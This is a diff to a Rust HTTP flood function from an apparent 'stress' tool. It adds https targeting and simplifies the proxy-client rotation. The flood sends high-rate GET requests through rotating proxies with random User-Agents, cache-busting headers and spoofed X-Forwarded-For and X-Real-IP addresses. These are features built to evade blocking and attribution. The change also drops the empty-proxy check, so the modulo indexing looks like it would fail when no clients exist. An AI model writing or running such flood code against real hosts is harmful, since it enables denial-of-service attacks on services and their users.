@@ -11,15 +11,17 @@ use super::{StressConfig, StressStats};
 use crate::proxy::{ProxyEntry, ProxyManager, ProxyType};
 
 pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> Result<StressStats> {
+    let scheme = if config.port == 443 { "https" } else { "http" };
     let target_url = if config.payload_size > 0 {
         format!(
-            "http://{}:{}/{}",
+            "{}://{}:{}/{}",
+            scheme,
             config.target,
             config.port,
             generate_random_path(config.payload_size)
         )
     } else {
-        format!("http://{}:{}", config.target, config.port)
+        format!("{}://{}:{}", scheme, config.target, config.port)
     };
 
     let proxy_manager = if config.use_proxies {
@@ -34,7 +36,7 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
         None
     };
 
-    let clients = build_clients(config, proxy_manager.as_ref()).await?;
+    let clients = build_clients(proxy_manager.as_ref()).await?;
     let total_requests = config.rate_pps * config.duration_secs;
     let mut proxy_index = 0usize;
 
@@ -59,14 +61,9 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
     let mut handles = Vec::with_capacity(worker_count);
 
     for worker_id in 0..worker_count {
-        let client = if clients.is_empty() {
-            None
-        } else {
-            proxy_index %= clients.len();
-            let client = clients[(proxy_index + worker_id) % clients.len()].clone();
-            proxy_index += 1;
-            Some(client)
-        };
+        proxy_index %= clients.len();
+        let client = clients[(proxy_index + worker_id) % clients.len()].clone();
+        proxy_index += 1;
         let url = target_url.clone();
         let metrics = metrics.clone();
         let request_idx = request_idx.clone();
@@ -82,22 +79,18 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
                 let result: std::result::Result<
                     reqwest::Response,
                     Box<dyn std::error::Error + Send + Sync>,
-                > = if let Some(client) = &client {
-                    client
-                        .get(&url)
-                        .header("User-Agent", random_user_agent())
-                        .header("Accept", "*/*")
-                        .header("Accept-Language", "en-US,en;q=0.9")
-                        .header("Cache-Control", "no-cache")
-                        .header("Pragma", "no-cache")
-                        .header("X-Forwarded-For", random_ip())
-                        .header("X-Real-IP", random_ip())
-                        .send()
-                        .await
-                        .map_err(|e| e.into())
-                } else {
-                    Err("no proxy available".into())
-                };
+                > = client
+                    .get(&url)
+                    .header("User-Agent", random_user_agent())
+                    .header("Accept", "*/*")
+                    .header("Accept-Language", "en-US,en;q=0.9")
+                    .header("Cache-Control", "no-cache")
+                    .header("Pragma", "no-cache")
+                    .header("X-Forwarded-For", random_ip())
+                    .header("X-Real-IP", random_ip())
+                    .send()
+                    .await
+                    .map_err(|e| e.into());
 
                 match result {
                     Ok(response) => {
@@ -128,11 +121,8 @@ pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> R
 }
 
 async fn build_clients(
-    config: &StressConfig,
     proxy_manager: Option<&ProxyManager>,
 ) -> Result<Vec<reqwest::Client>> {
-    let max_connections = config.concurrency.max(200);
-
     if let Some(manager) = proxy_manager {
         let healthy_proxies = manager.get_all_healthy_proxies().await;
         if healthy_proxies.is_empty() {
